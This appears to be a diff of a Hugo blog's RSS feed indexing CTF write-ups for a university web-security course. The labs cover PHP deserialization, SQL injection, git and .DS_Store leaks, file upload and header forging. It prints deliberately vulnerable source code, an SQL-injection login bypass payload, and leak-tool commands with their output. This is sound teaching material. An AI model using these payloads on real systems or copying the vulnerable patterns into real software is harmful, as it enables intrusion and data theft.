Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/index.html</guid><description>Simple Web 0x17(Lab - Baby Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8601/
-Background 0x16.5(php unserialize)
-Source code :::spoiler code
-&lt;?php isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Cat { public $name = '(guest cat)'; function __construct($name) { $this->name = $name; } function __wakeup() { echo "&lt;pre>"; system("cowsay 'Welcome back, $this->name'"); echo "&lt;/pre>"; } } if (!isset($_COOKIE['cat_session'])) { $cat = new Cat("cat_" . rand(0, 0xffff)); setcookie('cat_session', base64_encode(serialize($cat))); } else { $cat = unserialize(base64_decode($_COOKIE['cat_session'])); } ?> &lt;p>Hello, &lt;?= $cat->name ?>.&lt;/p> &lt;a href="https://bernie6401.github.io/?source">source code&lt;/a> :::</description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/index.html</guid><description>Simple Web 0x17(Lab - Baby Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8601/
-Background 0x16.5(php unserialize)
-Source code :::spoiler code
-&lt;?php isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Cat { public $name = '(guest cat)'; function __construct($name) { $this->name = $name; } function __wakeup() { echo "&lt;pre>"; system("cowsay 'Welcome back, $this->name'"); echo "&lt;/pre>"; } } if (!isset($_COOKIE['cat_session'])) { $cat = new Cat("cat_" . rand(0, 0xffff)); setcookie('cat_session', base64_encode(serialize($cat))); } else { $cat = unserialize(base64_decode($_COOKIE['cat_session'])); } ?> &lt;p>Hello, &lt;?= $cat->name ?>.&lt;/p> &lt;a href="https://bernie6401.github.io/?source">source code&lt;/a> :::</description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/index.html</guid><description>Simple Web 0x18(Lab - Magic Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8602/
-Background None…
-Source code :::spoiler code
-isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Magic { function cast($spell) { echo "&lt;script>alert('MAGIC, $spell!');&lt;/script>"; } } // Useless class? class Caster { public $cast_func = 'intval'; function cast($val) { return ($this->cast_func)($val); } } class Cat { public $magic; public $spell; function __construct($spell) { $this->magic = new Magic(); $this->spell = $spell; } function __wakeup() { echo "Cat Wakeup!\n"; $this->magic->cast($this->spell); } } if (isset($_GET['spell'])) { $cat = new Cat($_GET['spell']); } else if (isset($_COOKIE['cat'])) { echo "Unserialize...\n"; $cat = unserialize(base64_decode($_COOKIE['cat'])); } else { $cat = new Cat("meow-meow-magic"); } ?> &lt;pre> This is your 🐱: &lt;?php var_dump($cat) ?> &lt;/pre> &lt;p>Usage:&lt;/p> &lt;p>/?source&lt;/p> &lt;p>/?spell=the-spell-of-your-cat&lt;/p> :::</description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/index.html</guid><description>Simple Web 0x18(Lab - Magic Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8602/
-Background None…
-Source code :::spoiler code
-isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Magic { function cast($spell) { echo "&lt;script>alert('MAGIC, $spell!');&lt;/script>"; } } // Useless class? class Caster { public $cast_func = 'intval'; function cast($val) { return ($this->cast_func)($val); } } class Cat { public $magic; public $spell; function __construct($spell) { $this->magic = new Magic(); $this->spell = $spell; } function __wakeup() { echo "Cat Wakeup!\n"; $this->magic->cast($this->spell); } } if (isset($_GET['spell'])) { $cat = new Cat($_GET['spell']); } else if (isset($_COOKIE['cat'])) { echo "Unserialize...\n"; $cat = unserialize(base64_decode($_COOKIE['cat'])); } else { $cat = new Cat("meow-meow-magic"); } ?> &lt;pre> This is your 🐱: &lt;?php var_dump($cat) ?> &lt;/pre> &lt;p>Usage:&lt;/p> &lt;p>/?source&lt;/p> &lt;p>/?spell=the-spell-of-your-cat&lt;/p> :::</description></item><item><title>Simple Web 0x19(Lab - PHP Login)</title><link>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/index.html</guid><description>Simple Web 0x19(Lab - PHP Login) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8081
-Background Source code &lt;?php // BSides Ahmedabad CTF 2021: entrance include 'flag.php'; $users = array( "admin" => "ed2b7b57b3b5be3e8d4246c69e4b513608ffb352", "guest" => "35675e68f4b5af7b995d9205ad0fc43842f16450" ); function lookup($username) { global $users; return array_key_exists($username, $users) ? $users[$username] : ""; } if (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) { $sha1pass = lookup($_POST['username']); if ($sha1pass == sha1($_POST['password'])) { if ($_POST['username'] !== 'guest') echo $FLAG; else echo 'Welcome guest!'; } else { echo 'Login Failed!'; } } else { echo "You can login with guest:guest"; } echo "&lt;br>\n"; highlight_file(__file__); ?> Exploit Must change GET method to POST method and add Content-Type: application/x-www-form-urlencoded in header</description></item><item><title>Simple Web 0x22(Lab - Pug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/index.html</guid><description>Simple Web 0x22(Lab - Pug) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8008
-Source code :::spoiler
-const express = require('express'); const pug = require('pug'); const app = express(); const template = ` h1 Hello %NAME% form(method='GET' action='https://bernie6401.github.io/') div label(for='nickname') Name: input#nickname(type='text', placeholder='Nickname' name='name') button(type='submit') Submit a(href='https://bernie6401.github.io/source') Source Code `; app.get('/', (req, res) => { const name = (req.query.name ?? 'Anonymous').toString(); if (name.includes('{')) return res.send('Nice try'); let html = pug.render(template.replace('%NAME%', name)); res.set('Content-Type', 'text/html'); res.send(html); }); app.get("/source", (_, res) => { res.sendFile(__filename); }); app.listen(3000, () => console.log(':3000')); :::</description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/index.html</guid><description>Simple Web 0x23(Lab - XXE) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8604/
-Background XML Tree XML Parser AJAX - Server Response XML DTD
-输入流 php://input
-php://input可以读取没有处理过的POST数据。
-Day 18：Stream 概述
-php://input 取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。
-來自外部的威脅-XXE漏洞攻擊成因 :::spoiler XXE course lecture ::: :::spoiler exploit type</description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/index.html</guid><description>Simple Web 0x23(Lab - XXE) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8604/
-Background XML Tree XML Parser AJAX - Server Response XML DTD
-输入流 php://input
-php://input可以读取没有处理过的POST数据。
-Day 18：Stream 概述
-php://input 取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。
-來自外部的威脅-XXE漏洞攻擊成因 :::spoiler XXE course lecture ::: :::spoiler exploit type</description></item><item><title>Simple Web 0x24(Lab - how2http)</title><link>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/index.html</guid><description>Simple Web 0x24(Lab - how2http) Source code &lt;?php show_source(__FILE__); include("flag.php"); if (!empty($_SERVER["HTTP_CLIENT_IP"])){ $ip = $_SERVER["HTTP_CLIENT_IP"]; } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){ $ip = $_SERVER["HTTP_X_FORWARDED_FOR"]; } else { $ip = $_SERVER["REMOTE_ADDR"]; } if ($_COOKIE['user'] !== 'admin') die("Not admim"); if( $_SERVER["REQUEST_METHOD"] !== "FLAG" ) die("u don't need flag?"); if ($ip === "127.0.0.1") echo $FLAG; else echo "NOPE!"; ?> Recon 主要是參考之前寫過的PicoCTF - Who are you?和PicoCTF - Who are you?，按照source code我們需要更改一些header讓他可以被forge然後bypass這些條件，首先是IP，他其實給的很寬鬆，還有X-Forwarded-For的header可以用，就直接==X-Forwarded-For: 127.0.0.1==；另外，cookie的user要等於admin→==Cookie: user=admin==；再來，request method要等於FLAG→==FLAG / HTTP/1.1==
-Exploit</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NTUSTWS on SBK Hugo Site</title><link>https://bernie6401.github.io/tags/ntustws/</link><description>Recent content in NTUSTWS on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/ntustws/index.xml" rel="self" type="application/rss+xml"/><item><title>Simple Web 0x01(Lab - `gitleak`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</guid><description>&lt;h1 id="simple-web-0x01lab---gitleak">
+ Simple Web 0x01(Lab - &lt;code>gitleak&lt;/code>)
+ &lt;a class="anchor" href="#simple-web-0x01lab---gitleak">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9000/">http://h4ck3r.quest:9000/&lt;/a>&lt;/p>
+&lt;h2 id="exploit---gitleak--basic-git-command">
+ Exploit - gitleak + basic Git command
+ &lt;a class="anchor" href="#exploit---gitleak--basic-git-command">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Use the extension of Firefox(or Google), &lt;code>Dotgit&lt;/code>, to check if the website actually has &lt;code>git leak problem&lt;/code>
+&lt;img src="https://i.imgur.com/ZtMbj9z.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>denny0223/scrabble
+To use scrabble tool to leak information&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/denny0223/scrabble.git
+$ cd scrabble
+$ sudo ./scrabble http://h4ck3r.quest:9000/
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>
+&lt;p>Still no flag
+There&amp;rsquo;s &lt;code>flag.php&lt;/code> but still no flag in there. &lt;code>HEAD&lt;/code> said &lt;code>HEAD is now at a0228bd Remove flag.&lt;/code>
+Thus, we can look up the history by the command below.&lt;/p></description></item><item><title>Simple Web 0x02(Lab - `.DS_Store`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</guid><description>&lt;h1 id="simple-web-0x02lab---ds_store">
+ Simple Web 0x02(Lab - &lt;code>.DS_Store&lt;/code>)
+ &lt;a class="anchor" href="#simple-web-0x02lab---ds_store">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9001/">http://h4ck3r.quest:9001/&lt;/a>&lt;/p>
+&lt;h2 id="exploit---ds_store">
+ Exploit - &lt;code>.DS_Store&lt;/code>
+ &lt;a class="anchor" href="#exploit---ds_store">#&lt;/a>
+&lt;/h2>
+&lt;p>Clone &lt;code>lijiejie/ds_store_exp&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/lijiejie/ds_store_exp.git
+$ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store
+[200] http://h4ck3r.quest:9001/.DS_Store
+[200] http://h4ck3r.quest:9001/super_secret_meowmeow.php
+[200] http://h4ck3r.quest:9001/index.php
+$ cd h4ck3r.quest_9001
+$ cat super_secret_meowmeow.php
+FLAG{.DS_Store is so annoying lmao}
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Note that, must install &lt;code>python 2&lt;/code>, &lt;code>requests&lt;/code>, &lt;code>ds_store&lt;/code> and modify &lt;code>queue&lt;/code>(&lt;code>import queue&lt;/code>→&lt;code>import Queue as queue&lt;/code>)
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ conda create --name py2.7 python=2.7
+$ conda install -c auto ds_store
+$ conda install -c anaconda requests
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;/ul>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://bobbyhadz.com/blog/python-no-module-named-queue">python-no-module-named-queue&lt;/a>&lt;/p></description></item><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</guid><description>&lt;h1 id="simple-web-0x03lab---log-me-in--revenge">
+ Simple Web 0x03(Lab - Log me in + Revenge)
+ &lt;a class="anchor" href="#simple-web-0x03lab---log-me-in--revenge">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8200/">http://h4ck3r.quest:8200/&lt;/a>
+Challenge: &lt;a href="http://h4ck3r.quest:8201/">http://h4ck3r.quest:8201/&lt;/a>&lt;/p>
+&lt;h2 id="exploit---sqli">
+ Exploit - &lt;code>SQLi&lt;/code>
+ &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Payload → &lt;code>') or ('1'='1') -- #&lt;/code>
+SELECT * FROM admin WHERE (username=&amp;rsquo;&amp;rsquo;) or (&amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;) &amp;ndash; #&amp;rsquo;) AND (password=&amp;lsquo;MTIz&amp;rsquo;)&lt;/li>
+&lt;/ul>
+&lt;p>Flag: &lt;code>FLAG{b4by_sql_inj3cti0n}&lt;/code>&lt;/p>
+&lt;h2 id="revenge-source-code">
+ Revenge source code
+ &lt;a class="anchor" href="#revenge-source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from flask import Flask, render_template, redirect, request, g, Response
+import sqlite3
+
+app = Flask(__name__)
+
+
+def get_db():
+ db = getattr(g, &amp;#39;_database&amp;#39;, None)
+ if db is None:
+ db = g._database = sqlite3.connect(&amp;#39;/tmp/database.db&amp;#39;)
+ db.row_factory = sqlite3.Row
+ return db
+
+
+@app.before_first_request
+def init_db():
+ cursor = get_db().cursor()
+ cursor.execute(&amp;#34;&amp;#34;&amp;#34;
+ CREATE TABLE IF NOT EXISTS &amp;#34;admin&amp;#34; (
+ &amp;#34;username&amp;#34; TEXT NOT NULL,
+ &amp;#34;password&amp;#34; TEXT NOT NULL
+ )
+ &amp;#34;&amp;#34;&amp;#34;)
+ cursor.execute(&amp;#34;SELECT COUNT(*) as count FROM admin WHERE username=&amp;#39;admin&amp;#39;&amp;#34;)
+ count = cursor.fetchone()[&amp;#39;count&amp;#39;]
+ if count == 0:
+ import secrets
+ cursor.execute(&amp;#34;INSERT INTO admin (username, password) VALUES (?,?)&amp;#34;,
+ (&amp;#39;admin&amp;#39;, secrets.token_urlsafe()))
+ get_db().commit()
+
+
+@app.teardown_appcontext
+def close_connection(exception):
+ db = getattr(g, &amp;#39;_database&amp;#39;, None)
+ if db is not None:
+ db.close()
+
+
+@app.route(&amp;#34;/&amp;#34;)
+def home():
+ return render_template(&amp;#34;index.html&amp;#34;,
+ failed=request.args.get(&amp;#39;failed&amp;#39;) != None)
+
+
+@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
+def login():
+ username = request.form.get(&amp;#39;username&amp;#39;)
+ password = request.form.get(&amp;#39;password&amp;#39;)
+
+ if not username or not password:
+ return redirect(&amp;#34;/?failed&amp;#34;)
+
+ cur = get_db().execute(f&amp;#34;SELECT * FROM admin WHERE (username=&amp;#39;{username}&amp;#39;)&amp;#34;)
+ res = cur.fetchone()
+ cur.close()
+
+ if res[&amp;#39;username&amp;#39;] == &amp;#39;admin&amp;#39; and res[&amp;#39;password&amp;#39;] == password:
+ return &amp;#34;FLAG: FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#34;
+
+ return redirect(&amp;#34;/?failed&amp;#34;)
+
+
+
+@app.route(&amp;#34;/source&amp;#34;)
+def source():
+ import re
+ source_code = open(__file__).read()
+ source_code = re.sub(r&amp;#39;FLAG{[^}\s]+}&amp;#39;, &amp;#39;FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#39;, source_code, 1)
+ return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)
+
+
+if __name__ == &amp;#39;__main__&amp;#39;:
+ app.run(debug=True)
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x04(Lab - Image Space 0x01)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</guid><description>&lt;h1 id="simple-web-0x04lab---image-space-0x01">
+ Simple Web 0x04(Lab - Image Space 0x01)
+ &lt;a class="anchor" href="#simple-web-0x04lab---image-space-0x01">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9010">http://h4ck3r.quest:9010&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
+ if (isset($_GET[&amp;#39;source&amp;#39;])) {
+ highlight_file(__FILE__);
+ exit;
+ }
+?&amp;gt;
+&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
+&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
+&amp;lt;!-- upload form --&amp;gt;
+&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;p&amp;gt;
+ &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
+&amp;lt;/p&amp;gt;
+&amp;lt;?php
+ if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
+ die(&amp;#39;Give me a file!&amp;#39;);
+ }
+
+ $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);
+
+ $prefix = bin2hex(random_bytes(8));
+ move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
+ echo &amp;#34;&amp;lt;img src=\&amp;#34;images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x05(Lab - Image Space 0x02)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</guid><description>&lt;h1 id="simple-web-0x05lab---image-space-0x02">
+ Simple Web 0x05(Lab - Image Space 0x02)
+ &lt;a class="anchor" href="#simple-web-0x05lab---image-space-0x02">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9011">http://h4ck3r.quest:9011&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
+ if (isset($_GET[&amp;#39;source&amp;#39;])) {
+ highlight_file(__FILE__);
+ exit;
+ }
+?&amp;gt;
+&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
+&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
+&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;p&amp;gt;
+ &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
+&amp;lt;/p&amp;gt;
+&amp;lt;?php
+ if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
+ die(&amp;#39;Give me a file!&amp;#39;);
+ }
+
+ $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);
+ $extension = strtolower(explode(&amp;#34;.&amp;#34;, $filename)[1]);
+
+ if (!in_array($extension, [&amp;#39;png&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;jpg&amp;#39;]) !== false) {
+ die(&amp;#34;Invalid file extension: $extension.&amp;#34;);
+ }
+
+ $prefix = bin2hex(random_bytes(8));
+ move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
+ echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x06(Lab - Image Space 0x03)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</guid><description>&lt;h1 id="simple-web-0x06lab---image-space-0x03">
+ Simple Web 0x06(Lab - Image Space 0x03)
+ &lt;a class="anchor" href="#simple-web-0x06lab---image-space-0x03">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9012">http://h4ck3r.quest:9012&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://en.wikipedia.org/wiki/List_of_file_signatures">file signature&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
+ if (isset($_GET[&amp;#39;source&amp;#39;])) {
+ highlight_file(__FILE__);
+ exit;
+ }
+?&amp;gt;
+&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
+&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
+&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;p&amp;gt;
+ &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
+&amp;lt;/p&amp;gt;
+&amp;lt;?php
+ if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
+ die(&amp;#39;Give me a file!&amp;#39;);
+ }
+
+ $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);
+ $extension = strtolower(explode(&amp;#34;.&amp;#34;, $filename)[1]);
+
+ if (!in_array($extension, [&amp;#39;png&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;jpg&amp;#39;]) !== false) {
+ die(&amp;#34;Invalid file extension: $extension.&amp;#34;);
+ }
+
+ if (in_array($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;type&amp;#39;], [&amp;#34;image/png&amp;#34;, &amp;#34;image/jpeg&amp;#34;, &amp;#34;image/jpg&amp;#34;]) === false) {
+ die(&amp;#34;Invalid file type: &amp;#34; . $_SERVER[&amp;#34;CONTENT_TYPE&amp;#34;]);
+ }
+
+ list($_, $_, $type) = getimagesize($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]);
+
+ if ($type !== IMAGETYPE_JPEG &amp;amp;&amp;amp; $type !== IMAGETYPE_PNG) {
+ die(&amp;#34;Invalid image type.&amp;#34;);
+ }
+
+ $prefix = bin2hex(random_bytes(8));
+ move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
+ echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::
